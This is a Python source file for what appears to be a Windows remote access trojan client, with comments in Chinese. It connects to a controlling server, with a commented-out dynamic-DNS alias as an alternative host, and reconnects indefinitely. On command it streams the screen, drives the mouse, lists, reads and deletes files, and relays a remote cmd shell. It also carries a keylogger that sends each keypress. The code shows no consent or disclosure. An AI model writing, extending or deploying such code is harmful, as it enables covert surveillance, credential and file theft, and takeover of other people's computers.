import json
import random
from typing import Optional

import win32api
import _ctypes
import win32con
from time import time
from io import BytesIO
from os import walk, remove
from pynput import keyboard
from msvcrt import get_osfhandle
from subprocess import Popen, PIPE, STDOUT
from os.path import isfile, abspath
from base64 import b64encode, b64decode
from _winapi import PeekNamedPipe, ReadFile
from dxcampil import create as create_camera

from libs.packets import *

config_data = {}
DEFAULT_HOST = "127.0.0.1"  # "cfc8522bc8db.ofalias.net"
DEFAULT_PORT = 10616
DEFAULT_UUID = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
FILE_BLOCK = 1024 * 100
reconnect_time = 2


class ClientStopped(BaseException):
    pass


def load_config() -> None:
    global config_data
    config_path = abspath("config.json")
    if isfile(config_path):
        try:
            config_data = json.load(open(config_path))
            return
        except OSError:
            pass
    config_data = {"host": DEFAULT_HOST,
                   "port": DEFAULT_PORT,
                   "uuid": DEFAULT_UUID}
    try:
        with open(config_path, "w+") as f:
            f.write(json.dumps(config_data))
    except OSError:
        pass


class Client:
    def __init__(self, config: dict) -> None:
        self.host = config.get("host") if config.get("host") else DEFAULT_HOST
        self.port = config.get("port") if config.get("port") else DEFAULT_PORT
        self.uuid = config.get("uuid") if config.get("uuid") else DEFAULT_UUID
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.mouse_key_map = {
            "left": (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
            "middle": (win32con.MOUSEEVENTF_MIDDLEDOWN, win32con.MOUSEEVENTF_MIDDLEUP),
            "right": (win32con.MOUSEEVENTF_RIGHTDOWN, win32con.MOUSEEVENTF_RIGHTUP),
        }
        self.log_stack = {}
        self.__connected = False
        self.threads: list[Thread] = []
        # _cameraParent.transform (DoShake)

        # 屏幕传输相关
        self.sending_screen = False  # 是否发送屏幕
        self.screen_fps = 15  # 发送屏幕帧率
        self.shell_stop_flag = False  # 是否停止shell
        self.screen_format: str = ScreenFormat.JPEG  # 屏幕传输格式
        self.screen_quality = 80  # 使用JPEG格式时的传输质量
        self.pre_scaled = True  # 是否预缩放
        self.screen_size: tuple[int, int] = (860, 540)  # 预缩放提供的大小
        self.camera = create_camera()  # 截图所用相机
        self.key_listener = None
        self.shell_thread_running = False
        # noinspection PyTypeChecker
        self.shell: Popen = None

        self.packet_manager = PacketManager(self.connected)

    def log(self, *values: object):
        text = " ".join(map(str, values))
        self.log_stack[time()] = text
        print(text)

    def log_send_thread(self):
        while self.connected:
            for i in range(10):
                try:
                    min_time = min(self.log_stack.keys())
                    text = self.log_stack.pop(min_time)
                    packet_data = {
                        "type": "log",
                        "level": "info",
                        "text": text,
                        "time": time()
                    }
                    self.send_packet(packet_data)
                except (KeyError, ValueError):
                    break
            sleep(0.1)

    def start(self) -> None:
        print("启动客户端")
        print("开始尝试连接至服务器")
        self.connect_until()
        self.log("成功连接至服务器!")
        self.sock.sendall(int(self.uuid, 16).to_bytes(8, "big"))
        self.shell_thread = start_and_return(self.shell_output_thread)
        self.threads.append(start_and_return(self.log_send_thread))
        self.threads.append(start_and_return(self.packet_send_thread))
        self.threads.append(start_and_return(self.connection_init))
        self.threads.append(start_and_return(self.screen_send_thread))

        while self.connected:
            try:
                length, packet = self.recv_packet()
            except ConnectionError:
                self.connected = False
                break
            if packet is None:
                print("\r没有接收到数据包", end="")
                sleep(0.001)
                continue
            print("接收到数据包:", packet["type"])
            if not self.parse_packet(packet):
                raise ClientStopped
        # self.key_listener.stop()
        print("停止")
        for thread in self.threads:
            thread.join()

    def connection_init(self):
        packets = [
            {"type": HOST_NAME, "name": socket.gethostname()},
            self.get_screen_packet()
        ]
        for packet in packets:
            if packet:
                self.send_packet(packet)

    def get_screen_packet(self) -> Optional[Packet]:
        try:
            screen = self.camera.grab()
        except _ctypes.COMError:
            print("相机错误")
            del self.camera
            self.camera = create_camera()
            return self.get_screen_packet()
        if screen is None:
            return screen

        if self.pre_scaled:
            screen.thumbnail(self.screen_size)
        fmt = self.screen_format[:]
        if fmt == ScreenFormat.JPEG:
            image_io = BytesIO()
            screen.save(image_io, format="JPEG", quality=self.screen_quality)
        elif fmt == ScreenFormat.PNG:
            image_io = BytesIO()
            screen.save(image_io, format="PNG")
        elif fmt == ScreenFormat.RAW:
            image_io = BytesIO()
            image_io.write(screen.tobytes())
        else:
            self.screen_format = ScreenFormat.JPEG
            return self.get_screen_packet()
        image_bytes = image_io.getvalue()
        image_text = b64encode(image_bytes).decode("utf-8")
        packet = {
            "type": SCREEN,
            "size": screen.size,
            "format": fmt,
            "data": image_text
        }
        return packet

    def screen_send_thread(self):
        last_send = perf_counter()
        while self.connected:
            if self.sending_screen and perf_counter() - last_send > 1 / self.screen_fps:
                last_send = perf_counter()
                packet = self.get_screen_packet()
                if packet is None:
                    continue
                self.send_packet(packet, True)

    def run_infinitely(self):
        while True:
            # noinspection PyBroadException
            try:
                self.start()
            except Exception:
                print("遇到错误")
                pass
            except ClientStopped:
                print("服务端请求停止客户端")
                break
            except KeyboardInterrupt:
                print("运行终止")
                self.connected = False
                break

    # noinspection PyUnresolvedReferences
    def parse_packet(self, packet: Packet) -> bool:
        """处理数据包，当需要退出时返回False"""
        if packet["type"] == SET_MOUSE_POS:
            win32api.SetCursorPos((packet["x"], packet["y"]))
        elif packet["type"] == SET_MOUSE_BUTTON:
            mouse_flag = self.mouse_key_map[packet["button"]][packet["state"]]
            win32api.mouse_event(packet["x"], packet["y"], 0, mouse_flag)

        elif packet["type"] == SET_SCREEN_FORMAT:
            self.screen_format = packet["format"]
        elif packet["type"] == SET_SCREEN_FPS:
            self.screen_fps = packet["fps"]
        elif packet["type"] == SET_SCREEN_SIZE:
            self.screen_size = packet["size"]
        elif packet["type"] == SET_PRE_SCALE:
            self.pre_scaled = packet["enable"]
        elif packet["type"] == SET_SCREEN_QUALITY:
            self.screen_quality = packet["quality"]
        elif packet["type"] == SET_SCREEN_SEND:
            self.sending_screen = packet["enable"]
        elif packet["type"] == GET_SCREEN:
            screen_packet = self.get_screen_packet()
            if screen_packet is not None:
                self.send_packet(screen_packet)

        elif packet["type"] == REQ_LIST_DIR:
            packet = self.get_files_packet(packet["path"])
            self.send_packet(packet)
        elif packet["type"] == FILE_VIEW:
            start_and_return(self.file_view_thread, (packet,))
        elif packet["type"] == FILE_DELETE:
            remove(packet["path"])
        elif packet["type"] == SHELL_INIT:
            self.restore_shell()
        elif packet["type"] == SHELL_INPUT:
            try:
                self.shell.stdin.write(b64decode(packet["text"]))
                self.shell.stdin.flush()
            except OSError:
                self.send_packet({"type": SHELL_BROKEN})
        return True

    def file_view_thread(self, packet: Packet):
        path = packet["path"]
        data_max_size = packet["data_max_size"]

        error_packet = {
            "type": FILE_VIEW_ERROR,
            "path": path,
            "error": "未知错误"
        }
        try:
            with open(path, "rb") as file:
                data = file.read(data_max_size)
        except FileNotFoundError:
            error_packet["error"] = "文件不存在"
            self.send_packet(error_packet)
            return
        except PermissionError:
            error_packet["error"] = "权限不足"
            self.send_packet(error_packet)
            return
        except OSError:
            self.send_packet(error_packet)
            return

        cookie = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
        packet = {
            "type": FILE_VIEW_CREATE,
            "path": path,
            "cookie": cookie
        }
        self.send_packet(packet)
        for block in [data[i:i + FILE_BLOCK] for i in range(0, len(data), FILE_BLOCK)]:
            packet = {
                "type": FILE_VIEW_DATA,
                "path": path,
                "data": b64encode(block).decode("utf-8"),
                "cookie": cookie
            }
            self.send_packet(packet, priority=PacketPriority.NORMAL)
        packet = {
            "type": FILE_VIEW_OVER,
            "path": path,
            "cookie": cookie
        }
        self.send_packet(packet, priority=PacketPriority.LOWER)

    def shell_output_thread(self):
        self.shell_thread_running = True
        print("终端输出线程启动")
        try:
            while self.connected and (not self.shell_stop_flag):
                try:
                    output = self.get_output()
                    if output:
                        packet = {
                            "type": SHELL_OUTPUT,
                            "output": output
                        }
                        self.send_packet(packet, priority=PacketPriority.NORMAL)
                except BrokenPipeError:
                    self.send_packet({"type": SHELL_BROKEN})
                    break
                except OSError:
                    break
        except Exception as e:
            print(e)
        print("终端输出线程停止")
        self.shell_thread_running = False

    def get_output(self) -> str:
        # 读取输出
        output = ""
        handle = get_osfhandle(self.shell.stdout.fileno())
        avail_count, _ = PeekNamedPipe(handle, 0)
        if avail_count > 0:
            output, _ = ReadFile(handle, avail_count)
            output = output.decode("cp936", "ignore")

        if bool(output):
            return output
        else:
            return ""

    def connect_until(self):
        """重复连接直到连接成功"""
        global reconnect_time
        reconnect_time = 2
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while not self.connected:
            if self.try_connect():
                break
            self.scroll_sleep(reconnect_time, "连接失败, 等待{}秒后重连: {}s")
            # reconnect_time *= 1.5
            reconnect_time = int(reconnect_time)
            if reconnect_time > 60:
                reconnect_time = 60

    def on_key_press(self, key):
        start_and_return(self._on_key_press, (key,))

    def _on_key_press(self, key):
        if isinstance(key, keyboard.Key):
            s = key.name
            if key == keyboard.Key.space:
                s = " "
        elif isinstance(key, keyboard.KeyCode):
            if key.char is not None:
                s = key.char
            else:
                try:
                    s = chr(key.vk - 48)
                except ValueError:
                    s = "Error"
        else:
            return
        packet = {
            "type": KEY_EVENT,
            "key": s
        }
        self.send_packet(packet)

    @staticmethod
    def get_files_packet(path: str) -> Packet:
        walk_obj = walk(path)
        root, dirs, files = next(walk_obj)
        packet = {
            "type": DIR_LIST_RESULT,
            "path": path,
            "dirs": dirs,
            "files": files
        }
        return packet

    @staticmethod
    def scroll_sleep(waits: float, text: str):
        timer = time()
        while timer + waits > time():
            sleep(0.1)
            print("\r" + text.format(waits, round(time() - timer, 1)), end="")
        print("\r" + text.format(waits, waits) + "   ")

    def init_var(self):
        self.sending_screen = False  # 是否发送屏幕
        self.screen_fps = 15  # 发送屏幕帧率
        self.shell_stop_flag = False  # 是否停止shell
        self.screen_format: str = ScreenFormat.JPEG  # 屏幕传输格式
        self.screen_quality = 80  # 使用JPEG格式时的传输质量
        self.pre_scaled = True  # 是否预缩放
        self.screen_size: tuple[int, int] = (960, 540)  # 预缩放提供的大小
        self.key_listener = keyboard.Listener(on_press=self.on_key_press)
        self.shell_thread_running = False
        if getattr(self, "shell", None):
            self.shell.terminate()
        self.shell = Popen(["cmd"], stdin=PIPE, stdout=PIPE, stderr=STDOUT, shell=True, universal_newlines=False)

    def restore_shell(self):
        if getattr(self, "shell", None):
            self.shell.terminate()
            self.shell_stop_flag = True
            self.shell_thread.join()
            self.shell_stop_flag = False
        self.shell = Popen(["cmd"], stdin=PIPE, stdout=PIPE, stderr=STDOUT, shell=True, universal_newlines=False)
        if not self.shell_thread_running:
            self.shell_thread = start_and_return(self.shell_output_thread)

    def try_connect(self) -> bool:
        try:
            print("尝试连接至服务器")
            self.sock.connect((self.host, self.port))
            self.packet_manager.init_stack()
            self.init_var()
            self.sock.settimeout(1)
            self.packet_manager.set_socket(self.sock)
            # self.key_listener.start()
            self.connected = True
            return True
        except ConnectionError as e:
            print("连接时发生错误:", e)
            self.connected = False
            return False

    def packet_send_thread(self):
        self.packet_manager.packet_send_thread()

    def send_packet(self, packet: Packet, loss_enable: bool = False, priority: int = PacketPriority.HIGHER) -> None:
        if packet["type"] != SCREEN:
            print("发送数据包:", packet)
        self.packet_manager.send_packet(packet, loss_enable, priority)

    def recv_packet(self) -> tuple[int, None] | tuple[int, Packet]:
        return self.packet_manager.recv_packet()

    @property
    def connected(self):
        return self.__connected

    @connected.setter
    def connected(self, value: bool):
        self.__connected = value
        self.packet_manager.connected = value


if __name__ == "__main__":
    load_config()
    client = Client(config_data)
    client.run_infinitely()
